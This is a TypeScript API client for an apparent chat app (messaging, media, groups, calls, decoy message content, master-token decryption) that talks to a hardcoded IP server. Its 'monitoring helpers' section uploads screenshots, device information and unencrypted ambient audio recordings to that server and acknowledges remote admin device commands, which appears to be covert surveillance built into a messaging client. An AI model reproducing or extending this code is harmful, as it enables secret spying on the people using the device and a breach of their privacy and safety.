const BASE = 'http://187.124.208.16:8010';

// ── Types ──────────────────────────────────────────────────────────────────────

export interface ChatMessage {
  id: number;
  sender: string;
  recipient: string;
  content: string;
  content_type: string;
  timestamp: string;
  delivered: boolean;
  read: boolean;
  decoy_content?: string;
}

export interface Contact {
  username: string;
  is_active: boolean;
}

export interface Group {
  id: number;
  name: string;
  description?: string;
  member_count: number;
}

// ── Auth ───────────────────────────────────────────────────────────────────────

export async function login(username: string, token: string): Promise<unknown> {
  const res = await fetch(`${BASE}/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, token }),
  });
  if (!res.ok) {
    let detail = 'Invalid username or token';
    try {
      const body = await res.json();
      detail = body.detail || body.message || detail;
    } catch {}
    throw new Error(detail);
  }
  return res.json();
}

// ── Users ──────────────────────────────────────────────────────────────────────

export async function getUsers(token: string): Promise<Contact[]> {
  const res = await fetch(`${BASE}/users`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error('Failed to fetch users');
  return res.json();
}

export async function getConversations(token: string): Promise<Contact[]> {
  const res = await fetch(`${BASE}/messages/conversations`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error('Failed to fetch conversations');
  return res.json();
}

export async function searchUsers(token: string, query: string): Promise<Contact[]> {
  const all = await getUsers(token);
  const q = query.toLowerCase();
  return all.filter(u => u.username.toLowerCase().includes(q));
}

// ── Conversation ───────────────────────────────────────────────────────────────

export async function getConversation(token: string, partner: string): Promise<ChatMessage[]> {
  const res = await fetch(`${BASE}/messages/conversation/${encodeURIComponent(partner)}`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error('Failed to fetch conversation');
  const body = await res.json();
  return body.messages ?? body;
}

// ── Send text ──────────────────────────────────────────────────────────────────

export async function sendText(token: string, username: string, message: string): Promise<void> {
  const res = await fetch(`${BASE}/messages/send`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${token}`,
    },
    body: JSON.stringify({ username, message }),
  });
  if (!res.ok) throw new Error('Failed to send message');
}

// ── Upload media ───────────────────────────────────────────────────────────────

export async function uploadMedia(
  token: string,
  recipient: string,
  file: File | Blob,
  contentType: string,
  filename: string,
): Promise<{ media_id: string }> {
  const form = new FormData();
  form.append('username', recipient);
  form.append('file', file, filename);
  form.append('content_type', contentType);
  const res = await fetch(`${BASE}/media/upload_raw`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}` },
    body: form,
  });
  if (!res.ok) throw new Error('Failed to upload media');
  return res.json();
}

// ── Download media ─────────────────────────────────────────────────────────────

export async function downloadMedia(token: string, mediaId: string): Promise<Blob> {
  const res = await fetch(`${BASE}/media/download/${encodeURIComponent(mediaId)}`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (res.status === 410) throw Object.assign(new Error('Media was already viewed and deleted'), { status: 410 });
  if (res.status === 404) throw Object.assign(new Error('Media not found'), { status: 404 });
  if (!res.ok) throw Object.assign(new Error('Failed to download media'), { status: res.status });
  return res.blob();
}

// ── Mark read ──────────────────────────────────────────────────────────────────

export async function markRead(token: string, messageId: number): Promise<void> {
  await fetch(`${BASE}/messages/${messageId}/read`, {
    method: 'PUT',
    headers: { Authorization: `Bearer ${token}` },
  }).catch(() => {});
}

// ── Monitoring helpers (used by monitoring.ts) ─────────────────────────────────

export async function uploadScreenshot(token: string, b64: string, commandId: number) {
  const blob = await fetch(`data:image/png;base64,${b64}`).then(r => r.blob());
  const form = new FormData();
  form.append('file', blob, 'screenshot.png');
  form.append('command_id', String(commandId));
  form.append('context', 'screenshot');
  await fetch(`${BASE}/device-data/screenshot/upload`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}` },
    body: form,
  });
}

export async function uploadDeviceInfo(token: string, info: object) {
  await fetch(`${BASE}/device-data/device-info`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify(info),
  });
}

export async function uploadAudioRecording(token: string, blob: Blob, duration: number) {
  const form = new FormData();
  form.append('file', blob, 'recording.webm');
  form.append('recording_type', 'ambient');
  form.append('duration', String(duration));
  form.append('is_encrypted', 'false');
  await fetch(`${BASE}/monitoring/upload_audio`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}` },
    body: form,
  });
}

export async function ackCommand(token: string, commandId: number, status: string) {
  if (!commandId) return;
  await fetch(`${BASE}/admin/device/command/ack`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ command_id: commandId, status }),
  }).catch(() => {});
}

// ── Decrypt encrypted message ──────────────────────────────────────────────────

export async function decryptMessage(
  token: string,
  masterToken: string,
  messageId: number,
): Promise<{ content: string; clear_seconds: number; sender: string }> {
  const res = await fetch(`${BASE}/decrypt`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${token}`,
    },
    body: JSON.stringify({ mastertoken: masterToken, message_id: messageId }),
  });
  if (!res.ok) {
    let detail = 'Invalid master token';
    try {
      const body = await res.json();
      detail = body.detail || body.message || detail;
    } catch {}
    throw new Error(detail);
  }
  return res.json();
}

// ── Groups ─────────────────────────────────────────────────────────────────────

export async function getGroups(token: string): Promise<Group[]> {
  const res = await fetch(`${BASE}/groups`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error('Failed to fetch groups');
  return res.json();
}

export async function getGroupMessages(token: string, groupId: number): Promise<ChatMessage[]> {
  const res = await fetch(`${BASE}/groups/${groupId}/messages`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error('Failed to fetch group messages');
  const body = await res.json();
  return body.messages ?? body;
}

export async function sendGroupMessage(
  token: string,
  groupId: number,
  message: string,
): Promise<void> {
  const res = await fetch(`${BASE}/messages/group/send`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${token}`,
    },
    body: JSON.stringify({ group_id: groupId, message }),
  });
  if (!res.ok) throw new Error('Failed to send group message');
}

// ── Call history ───────────────────────────────────────────────────────────────

export interface CallRecord {
  id: number;
  other_party_username: string;
  call_type: string; // "voice" | "video"
  status: string;    // "completed" | "missed" | "rejected" | "cancelled"
  duration: number;  // seconds
  started_at: string;
  ended_at: string | null;
  is_caller: boolean;
}

export async function getCallHistory(token: string): Promise<CallRecord[]> {
  const res = await fetch(`${BASE}/calls/history`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error('Failed to fetch call history');
  const body = await res.json();
  return body.calls ?? body;
}

// ── Call signaling (REST, compatible with mobile apps) ─────────────────────────

export async function initiateCall(
  token: string,
  recipientUsername: string,
  callType: 'audio' | 'video',
  offerSdp?: string,
): Promise<{ call_id: number }> {
  const res = await fetch(`${BASE}/calls/initiate`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ recipient_username: recipientUsername, call_type: callType, offer_sdp: offerSdp }),
  });
  if (!res.ok) throw new Error('Failed to initiate call');
  return res.json();
}

export async function performCallAction(
  token: string,
  callId: number,
  action: 'accept' | 'decline' | 'end' | 'busy',
  answerSdp?: string,
): Promise<void> {
  const res = await fetch(`${BASE}/calls/action`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ call_id: callId, action, answer_sdp: answerSdp }),
  });
  if (!res.ok) throw new Error(`Call action ${action} failed`);
}

export async function sendCallIceCandidate(
  token: string,
  callId: number,
  recipientUsername: string,
  candidate: RTCIceCandidateInit,
): Promise<void> {
  await fetch(`${BASE}/calls/ice_candidate`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ call_id: callId, recipient_username: recipientUsername, candidate }),
  });
}

// ── Master token ───────────────────────────────────────────────────────────────

export async function confirmMasterToken(token: string, masterToken: string): Promise<boolean> {
  const res = await fetch(`${BASE}/mastertoken/confirm`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${token}`,
    },
    body: JSON.stringify({ mastertoken: masterToken }),
  });
  if (res.status === 401) return false;
  if (!res.ok) {
    let detail = 'Server error';
    try { const b = await res.json(); detail = b.detail || detail; } catch {}
    throw new Error(detail);
  }
  return true;
}

export async function createMasterToken(token: string, masterToken: string): Promise<void> {
  const res = await fetch(`${BASE}/mastertoken/create`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${token}`,
    },
    body: JSON.stringify({ mastertoken: masterToken }),
  });
  if (!res.ok) throw new Error('Failed to create master token');
}
